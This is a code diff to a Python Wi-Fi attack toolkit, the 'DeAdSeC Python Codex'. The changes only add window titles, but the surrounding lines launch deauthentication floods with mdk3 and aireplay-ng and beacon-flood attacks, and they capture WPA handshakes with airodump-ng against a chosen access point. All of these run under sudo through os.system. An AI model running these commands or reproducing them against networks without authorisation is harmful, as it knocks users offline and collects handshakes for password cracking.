@@ -1,6 +1,6 @@
 #-----------Welcome to DeAdSeC Python Codex----------#
 #-------Made By DeAdSeC-------#
-#---Version 2.1.2---#
+#---Version 2.1.3---#
 
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
@@ -629,7 +629,7 @@ class Attacks():
         input(f'Click {O}ENTER{W} to continue')
         time.sleep(1)
         print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
-        os.system(f'sudo xterm -fg red -geometry 100x20-0+0 -e sudo mdk3 {interface} d -c {channel}')
+        os.system(f'sudo xterm -title MDK3 -fg red -geometry 100x20-0+0 -e sudo mdk3 {interface} d -c {channel}')
         print(f'{R}CTRL-C detected! Ending attack!{W}')
         time.sleep(1)
         return Menus.DOS()
@@ -640,7 +640,7 @@ class Attacks():
         os.system(f'sudo iwconfig {interface} channel {channel}')
         time.sleep(1)
         print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
-        os.system(f'sudo xterm -fg red -geometry 100x20-0+0 -e sudo aireplay-ng -0 0 -a {bssid} {interface}')
+        os.system(f'sudo xterm -title AIREPLAY -fg red -geometry 100x20-0+0 -e sudo aireplay-ng -0 0 -a {bssid} {interface}')
         print(f'{R}CTRL-C detected! Ending attack!{W}')
         time.sleep(1)
         return Menus.DOS()
@@ -649,7 +649,7 @@ class Attacks():
         input(f'Click {O}ENTER{W} to start attack')
         time.sleep(1)
         print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
-        os.system(f'sudo xterm -fg red -geometry 100x20-0+0 -e sudo mdk3 {interface} w -e {essid} -c {channel}')
+        os.system(f'sudo xterm -title CONFUSION -fg red -geometry 100x20-0+0 -e sudo mdk3 {interface} w -e {essid} -c {channel}')
         print(f'{R}CTRL-C detected! Ending attack!{W}')
         time.sleep(1)
         return Menus.DOS()
@@ -665,7 +665,7 @@ class Attacks():
                 os.system(f'sudo iwconfig {interface} channel {channel}')
                 time.sleep(1)
                 print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
-                os.system(f'sudo xterm -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo aireplay-ng -0 0 -a {bssid} {interface}')
+                os.system(f'sudo xterm -title AIRODUMP AIREPLAY -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo aireplay-ng -0 0 -a {bssid} {interface}')
                 print(f'{R}Ending attack ...{W}')
                 time.sleep(1)
                 print(f'HandShake file saved in {O}Data/HandShakes{W}')
@@ -677,7 +677,7 @@ class Attacks():
                 os.system(f'sudo iwconfig {interface} channel {channel}')
                 time.sleep(1)
                 print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
-                os.system(f'sudo xterm -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo aireplay-ng -0 0 -a {bssid} {interface}')
+                os.system(f'sudo xterm -title AIRODUMP AIREPLAY -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo aireplay-ng -0 0 -a {bssid} {interface}')
                 print(f'{R}CTRL-C detected! Ending attack!{W}')
                 time.sleep(1)
                 print(f'HandShake file saved in {O}Data/HandShakes{W}')
@@ -689,14 +689,14 @@ class Attacks():
                 FileName = 'HandShake'
                 print(f'Press {O}ENTER{W} to start attack')
                 print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
-                os.system(f'sudo xterm -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo mdk3 {interface} d -c {channel}')
+                os.system(f'sudo xterm -title AIRODUMP MDK3 -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo mdk3 {interface} d -c {channel}')
                 print(f'HandShake file saved in {O}Data/HandShakes{W}')
                 input(f'Press {O}ENTER{W} to continue!')
                 return Menus.HANDSHAKE()
             else:
                 print(f'Press {O}ENTER{W} to start attack')
                 print(f'Starting attack ... {O}[CTRL-C to exit]{W}')
-                os.system(f'sudo xterm -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo mdk3 {interface} d -c {channel}')
+                os.system(f'sudo xterm -title AIRODUMP MDK3 -fg green -geometry 100x20-0+0 -e sudo airodump-ng -c {channel} --bssid {bssid} -w Data/HandShakes/{FileName} {interface} & sudo xterm -fg red -geometry 100x20+0+0 -e sudo mdk3 {interface} d -c {channel}')
                 print(f'HandShake file saved in {O}Data/HandShakes{W}')
                 input(f'Press {O}ENTER{W} to continue!')
                 return Menus.HANDSHAKE()
@@ -711,10 +711,10 @@ class AiroDump():
 
         if ExplorePath == True:
             os.remove(f'{Directory}{FileNameCSV}')
-            os.system(f'xterm -geometry 140x30-0+0 -e sudo airodump-ng -w {Directory}{FileName} --output-format csv {interface}')
+            os.system(f'xterm -title AIRODUMP -geometry 140x30-0+0 -e sudo airodump-ng -w {Directory}{FileName} --output-format csv {interface}')
             return AiroDump.Decoder(Menu)
         else:
-            os.system(f'sudo airodump-ng -w {Directory}{FileName} --output-format csv {interface}')
+            os.system(f'xterm -title AIRODUMP -geometry 140x30-0+0 -e sudo airodump-ng -w {Directory}{FileName} --output-format csv {interface}')
             return AiroDump.Decoder(Menu)
 
     def Decoder(Menu):
